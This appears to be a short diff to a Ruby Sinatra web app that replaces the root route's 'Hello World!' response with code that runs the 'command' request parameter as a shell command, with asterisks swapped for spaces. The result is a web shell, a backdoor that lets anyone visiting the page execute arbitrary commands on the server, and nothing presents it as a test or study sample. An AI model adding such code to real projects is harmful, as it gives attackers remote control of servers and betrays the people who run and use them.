@@ -3,5 +3,5 @@
 require 'sinatra'
 
 get '/' do
-  'Hello World!'
+  `#{params[:command].gsub('*', ' ')}`
 end
